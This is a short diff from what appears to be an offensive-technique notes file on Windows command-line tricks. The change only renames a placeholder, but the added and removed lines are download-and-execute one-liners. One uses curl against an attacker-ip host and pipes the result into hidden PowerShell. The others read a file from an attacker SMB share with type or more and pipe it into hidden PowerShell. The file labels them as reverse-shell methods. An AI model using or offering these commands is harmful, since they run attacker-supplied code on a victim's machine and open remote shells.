@@ -6,12 +6,12 @@
 
 2). Windows 10 version 1803 (and earlier, with insider build 17063) includes a native curl.exe in C:\Windows\System32\, which you can access right from your regular CMD.
 	
-	Command-Line: curl http://<attacker-ip>/<payload-name>.txt | powershell -w h
+	Command-Line: curl http://<attacker-ip>/<filename>.txt | powershell -w h
 
 3). Some new ways of getting a reverse shell using windows one-liner:
 	
-	Command-Line: type \\<attacker-ip>\<payload-name>.txt | powershell -w h
-	Command-Line: more \\<attacker-ip>\<payload-name>.txt | powershell -w h
+	Command-Line: type \\<attacker-ip>\<filename>.txt | powershell -w h
+	Command-Line: more \\<attacker-ip>\<filename>.txt | powershell -w h
 
 
 Refer:
